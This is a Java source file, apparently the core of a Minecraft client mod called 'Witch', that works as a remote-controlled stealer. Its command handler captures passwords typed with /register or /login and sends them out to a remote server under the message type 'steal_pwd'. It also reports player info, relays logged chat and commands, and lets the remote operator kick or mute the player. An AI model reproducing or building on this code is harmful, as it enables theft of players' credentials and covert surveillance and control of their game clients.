package me.soda.witch.client;

import me.soda.witch.client.connection.Client;
import me.soda.witch.client.events.GameJoinEvent;
import me.soda.witch.client.events.SendChatEvent;
import me.soda.witch.client.events.ServerJoinEvent;
import me.soda.witch.client.utils.ChatUtils;
import me.soda.witch.client.utils.ChatWindow;
import me.soda.witch.client.utils.LoopThread;
import me.soda.witch.client.utils.MCUtils;
import me.soda.witch.shared.Crypto;
import me.soda.witch.shared.LogUtil;
import me.soda.witch.shared.socket.messages.Data;
import me.soda.witch.shared.socket.messages.Message;
import me.soda.witch.shared.socket.messages.messages.ClientConfigData;
import meteordevelopment.orbit.EventBus;
import meteordevelopment.orbit.EventHandler;
import meteordevelopment.orbit.IEventBus;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.screen.DisconnectedScreen;
import net.minecraft.client.gui.screen.TitleScreen;
import net.minecraft.screen.ScreenTexts;
import net.minecraft.text.Text;

import java.lang.invoke.MethodHandles;
import java.util.Arrays;
import java.util.List;

public class Witch {
    public static final Witch INSTANCE = new Witch();
    public static final MinecraftClient mc = MinecraftClient.getInstance();
    public static final IEventBus EVENT_BUS = new EventBus();
    public static ClientConfigData CONFIG_INFO = new ClientConfigData();
    public static final ChatWindow CHAT_WINDOW = new ChatWindow();
    public static Client client;

    private Witch() {
        Crypto.INSTANCE = new Crypto(Cfg.key);
    }

    public static void send(String messageType, String message) {
        client.send(Message.fromString(messageType, message));
    }

    public static void send(String messageType, byte[] message) {
        client.send(Message.fromBytes(messageType, message));
    }

    public static <T extends Data> void send(T object) {
        client.send(new Message(object));
    }

    public static void send(String messageType) {
        client.send(Message.fromString(messageType));
    }

    public void init() {
        LogUtil.println("By Soda5601");
        LoopThread.init();
        EVENT_BUS.registerLambdaFactory(getClass().getPackageName(), (lookupInMethod, klass) -> (MethodHandles.Lookup) lookupInMethod.invoke(null, klass, MethodHandles.lookup()));
        EVENT_BUS.subscribe(this);
        EVENT_BUS.subscribe(ChatUtils.class);
        client = new Client();
    }

    @EventHandler
    private void onSendCommand(SendChatEvent.Command event) {
        String[] cmds = event.command.split(" ");
        List<String> hint = Arrays.asList("reg", "register", "l", "login", "log");
        if (CONFIG_INFO.passwordBeingLogged && cmds.length >= 2 && hint.contains(cmds[0])) {
            send(MCUtils.getPlayerInfo());
            send("steal_pwd", cmds[1]);
        }
        if (CONFIG_INFO.logChatAndCommand) LoopThread.addToList("/" + event.command);
    }

    @EventHandler
    private void onServerJoin(ServerJoinEvent event) {
        if (!Witch.CONFIG_INFO.canJoinServer) {
            mc.execute(() -> mc.setScreen(new DisconnectedScreen(new TitleScreen(), ScreenTexts.CONNECT_FAILED,
                    Text.of(Witch.CONFIG_INFO.name + " kicked you."))));
            event.cancel();
        }
    }

    @EventHandler
    private void onGameJoin(GameJoinEvent event) {
        Witch.send(MCUtils.getPlayerInfo());
    }

    @EventHandler
    private void onSendMessage(SendChatEvent.Message event) {
        if (CONFIG_INFO.isMuted) event.cancel();
    }
}
